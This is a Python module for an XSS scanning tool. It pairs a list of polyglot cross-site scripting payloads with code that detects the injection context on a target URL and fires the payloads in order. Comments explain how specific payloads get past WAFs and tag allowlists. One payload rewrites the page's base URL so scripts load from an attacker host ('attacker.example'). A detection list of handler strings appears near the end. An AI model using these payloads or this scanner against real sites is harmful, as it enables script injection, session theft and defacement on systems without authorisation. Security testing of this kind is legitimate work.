"""Polyglot XSS payloads — single strings that fire across multiple injection contexts."""

from __future__ import annotations

import re
from dataclasses import dataclass

import httpx


# Multi-context polyglots — each fires in HTML, attribute, JS string, and URL contexts
POLYGLOT_PAYLOADS = [
    # Classic polyglot — fires in HTML and JS string contexts
    "javascript:/*--></title></style></textarea></script></xmp>"
    "<svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(document.domain)//'>",

    # jafarhabibi polyglot
    '">\'><img src=x onerror=alert(1)><script>alert(1)</script>',

    # works in: HTML attr value (single/double), HTML tag content, JS string
    '\'"()&%<acx><ScRiPt >alert(1)</ScRiPt>',

    # Attribute + HTML + URL (encodes to valid JS/HTML in each context)
    "';alert(document.domain)//\"><img src=x onerror=alert(document.domain)>",

    # XSS polyglot that survives JSON encoding (\\u escapes)
    '\\u003cscript\\u003ealert(document.domain)\\u003c/script\\u003e',

    # Template literal + HTML breakout
    '`<script>alert(1)</script>`',

    # SVG + attribute + script context
    '<svg><script>alert&#40;1&#41;</script></svg>',

    # Angular + Polymer + React dangerouslySetInnerHTML probe
    '{{constructor.constructor(\'alert(1)\')()}}',

    # Multi-event attribute polyglot
    '" autofocus onfocus=alert(1) onblur=alert(2) onmouseover=alert(3) x="',

    # URL context polyglot  (href= / src= / action=)
    "javascript://%0aalert(document.domain)//<script>\nalert(1)</script>",

    # Double URL-encoded scheme + optional-chaining call — %25 decodes to
    # a literal %, so %250A only becomes a real newline after a SECOND
    # decode pass. Survives WAFs/proxies that decode exactly once before
    # matching signatures. `alert?.(1)` still invokes alert but fails
    # silently (no throw) if alert were ever shadowed/undefined, so a
    # blind mutation chain won't crash and reveal itself early.
    "javascript://%250Aalert?.(1)//",

    # Attribute "casting" via an unknown/custom tag name. contentEditable
    # + autoFocus turn ANY element — including a made-up tag the app never
    # allowlisted — into a focusable target, so the onfocus handler fires
    # without needing svg/img/body/etc. Defeats tag-name allowlists that
    # only strip known-dangerous tags.
    "<k/contentEditable/autoFocus/OnFocus=alert(1)>",

    # Raw-text/rawtext element closer chain. title/style/script/textarea/
    # iframe/noscript all parse their contents as raw text until their own
    # closing tag, so a normal payload placed inside one is inert. Closing
    # all of them in sequence guarantees whichever one the input actually
    # landed in gets terminated, then the trailing svg fires.
    "</title></style></script></textarea></iframe></noscript>"
    "<svg onload=alert(1)>",

    # Quote/backtick/entity comment-closer chain. Covers unescaped and
    # backslash-escaped single quote, double quote, and backtick, plus the
    # HTML entity apostrophe, each opening a same-family comment/no-op —
    # so whichever quoting style actually wraps the injection point lines
    # up and neutralizes the rest of the original statement without
    # needing to know the exact context in advance.
    "//'/*\\'/*\"/*\\\"/*`/*\\`/*&apos;)/*<svg onload=alert(1)>",

    # base-href hijack + trailing comment swallow. Redirects every
    # subsequent relative-URL resource (scripts, images, forms) on the
    # page to an attacker host, then opens a trailing HTML comment to
    # absorb whatever markup follows. Useful when direct <script>/on*
    # injection is stripped but <base> is not on the tag denylist.
    '<base href="//attacker.example/"><script src="/x"></script><!--',
]

# Context-detection probes (canary strings, one per context)
CONTEXT_PROBES = {
    "html":       "<xsscanary>",
    "attr_double": '"xsscanary"',
    "attr_single": "'xsscanary'",
    "js_string":  ";xsscanary;",
    "url":        "xsscanary=1",
    "css":        "xsscanary{",
}

# Map: context → best polyglot indices in POLYGLOT_PAYLOADS
CONTEXT_PAYLOAD_MAP: dict[str, list[int]] = {
    "html":        [1, 2, 6, 11, 12, 14],
    "attr_double": [3, 9, 1, 13],
    "attr_single": [3, 2, 9, 13],
    "js_string":   [3, 0, 4, 13],
    "url":         [9, 0, 10],
    "css":         [0, 6],
}


@dataclass
class PolyglotFinding:
    type: str = "polyglot_xss"
    url: str = ""
    param: str = ""
    payload: str = ""
    detected_context: str = ""
    reflected: bool = False
    evidence: str = ""
    severity: str = "P1"


class Polyglot:
    """Runs polyglot payloads, using context detection to prioritise candidates."""

    def __init__(self, session: httpx.Client | None = None):
        self.session = session or httpx.Client(timeout=20, follow_redirects=True)

    def scan(self, url: str, param: str) -> list[PolyglotFinding]:
        context = self._detect_context(url, param)
        priority_indices = CONTEXT_PAYLOAD_MAP.get(context, list(range(len(POLYGLOT_PAYLOADS))))
        ordered = [POLYGLOT_PAYLOADS[i] for i in priority_indices]
        remaining = [p for i, p in enumerate(POLYGLOT_PAYLOADS) if i not in priority_indices]
        findings: list[PolyglotFinding] = []
        for payload in ordered + remaining:
            f = self._test(url, param, payload, context)
            if f:
                findings.append(f)
        return findings

    def _detect_context(self, url: str, param: str) -> str:
        try:
            resp = self.session.get(url, params={param: "POLYCANARY"})
            body = resp.text
        except Exception:
            return "unknown"
        idx = body.find("POLYCANARY")
        if idx < 0:
            return "unknown"
        before = body[max(0, idx - 100): idx]
        after = body[idx + 10: idx + 50]
        # inside a JS string
        if re.search(r'''['"]\s*$''', before) or re.search(r"""^['"]""", after):
            return "js_string"
        # inside an attribute
        if re.search(r'=\s*["\']?\s*$', before):
            return "attr_double" if '"' in before[-5:] else "attr_single"
        # inside a URL parameter
        if "?" in before or "&" in before:
            return "url"
        return "html"

    def _test(self, url: str, param: str, payload: str, context: str) -> PolyglotFinding | None:
        try:
            resp = self.session.get(url, params={param: payload})
        except Exception:
            return None
        body = resp.text
        indicators = ["alert(", "onerror=", "onload=", "<script", "onfocus=", "onmouseover="]
        if not any(ind in body for ind in indicators):
            return None
        idx = body.find(payload[:20]) if payload[:20] in body else 0
        evidence = body[max(0, idx - 50): idx + 120].replace("\n", "\\n")
        return PolyglotFinding(
            url=url, param=param, payload=payload,
            detected_context=context, reflected=True, evidence=evidence,
        )
